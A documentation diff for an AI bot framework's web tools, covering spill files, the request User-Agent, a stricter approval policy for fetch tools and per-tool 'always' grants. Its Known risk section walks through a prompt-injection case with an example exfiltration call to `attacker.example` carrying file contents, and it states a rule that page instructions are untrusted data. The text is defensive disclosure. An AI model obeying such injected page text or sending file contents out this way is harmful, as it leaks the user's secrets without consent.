@@ -56,13 +56,15 @@ warning and uses the defaults. Unknown keys count as a typo, so mistakes are
 not silently ignored.
 
 Large pages and feeds are cut to a size the model can read, and the full text
-is saved under `<data_dir>/spill/`.
+is saved under `<data_dir>/spill/`. Those files are not cleaned up
+automatically yet; delete old ones by hand if they pile up.
 
 ## Privacy
 
 Search queries go to the search provider you chose (DuckDuckGo, Brave, or your
 own SearXNG), and fetched URLs go to the sites they point at, from your
-machine's IP address. Nothing else from your computer is sent. If that matters
+machine's IP address. Requests carry a `User-Agent: Praxi-Bot/<version>
+(web-tools)` header; nothing else identifying your computer is sent. If that matters
 to you, point `searxng_url` at an instance you control or remove the `web_*`
 tools from a bot's `allow` list.
 
@@ -77,23 +79,37 @@ tools from a bot's `allow` list.
 - **Untrusted content.** Everything a page says is data. Each result starts with
   an "untrusted external content" notice, and a bot must not treat instructions
   inside a page as coming from you.
-- **Approvals.** The web tools only read, so under the default policy a search
-  or fetch runs without asking you each time. They belong to the `browser`
-  permission category: if you set `browser` to `deny` for a bot, the web tools
-  are denied too. Tools that act on a page (`browser_click`, `browser_fill`,
-  ...) still ask as before.
+- **Approvals.** The tools are split by where they send data:
+  - `web_search` only talks to the search provider you configured, so it runs
+    without asking, like other read-only tools.
+  - `web_extract`, `web_feed`, `web_sitemap` and `web_metadata` contact any
+    address the model picks, so they **ask for approval on every call under the
+    default policy**, exactly like `browser_open`.
+  - All five belong to the `browser` permission category: if you set `browser`
+    to `deny` for a bot, they are all denied.
+
+### Letting a bot fetch without asking
+
+If you trust a bot enough, approve one fetch with the "always" choice (the
+`always` scope in [Chatting and approvals](chatting-and-approvals.md)). That
+remembers `web_extract` (or the tool you approved) for that bot only, and later
+calls run without a prompt. Grant each fetch tool separately; `always_category`
+would also cover every other `browser` tool, so prefer the per-tool choice. You
+can review and remove grants as described in that guide.
 
 ## Known risk
 
-Because the web tools run without asking, a malicious page could try to
-persuade the bot (prompt injection) to put something it has seen into a search
-query or a URL, which would then be sent to a third party without a prompt. The
-permission engine has no taint or egress tracking for content read from
-untrusted sources, so this is only bounded, not prevented: queries are capped at
-400 characters and URLs at 2,048, local and private addresses are refused,
-results are labelled untrusted, and you can remove `web_*` from a bot's `allow`
-list or set the `browser` category to `ask` or `deny`. Treat a bot that handles
-secrets and also browses the web with care.
+The permission engine has no taint or egress tracking for content read from
+untrusted sources, so this risk is bounded, not prevented. If you grant a fetch
+tool to a bot that can also read files (for example a General assistant, which
+has `fs_read`), a malicious page can try to persuade the bot (prompt injection)
+to read a file and send it out with
+`web_extract https://attacker.example/?d=<file contents>`, repeatedly and
+without a prompt. Without the grant every fetch asks, and you see the URL
+before it is sent. Mitigations that exist: URLs are capped at 2,048 characters
+and search queries at 400, local and private addresses are refused, results are
+labelled untrusted, and you can drop `fs_*` or `web_*` from a bot's `allow`
+list. Do not grant fetch to a bot that handles secrets or reads sensitive files.
 
 ## Check that it works
 
